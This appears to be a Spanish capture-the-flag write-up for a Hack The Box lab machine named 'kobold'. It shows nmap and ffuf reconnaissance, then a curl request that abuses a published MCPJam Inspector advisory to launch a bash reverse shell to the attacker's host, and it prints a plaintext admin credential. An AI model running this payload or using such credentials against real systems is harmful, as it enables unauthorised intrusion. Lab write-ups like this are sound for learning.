
```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.16.146 -oG allPorts
```

```shell
 [*] IP Address: 10.129.16.146
 [*] Open ports: 22,80,443,3552
```

```shell
nmap -p22,80,443,3552 -sCV -vvv 10.129.16.146 -oN targeted
```

Hacemos fuzzing sobre la web en búsqueda de directorios
```shell
ffuf -c -u https://kobold.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

Al no encontrar nada haremos uno de subdominios
```shell
ffuf -c -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302
```

Encontrando los subdominios `mcp` y `bin`, los añadiremos al `/etc/hosts`
Navegaremos a `mcp` nos encontramos con MCPJam Inspector el cual buscando en internet tiene una vulnerabilidad
`https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6`

```shell
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": [
        "-c",
        "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"
      ],
      "env": {}
    },
    "serverId": "pwned"
  }'
```

Obteniendo una shell como `ben`

Accederemos a la web que esta en el puerto 3552 con las credenciales
```ad-hint
arcane::ComplexP@sswordAdmin1928
```

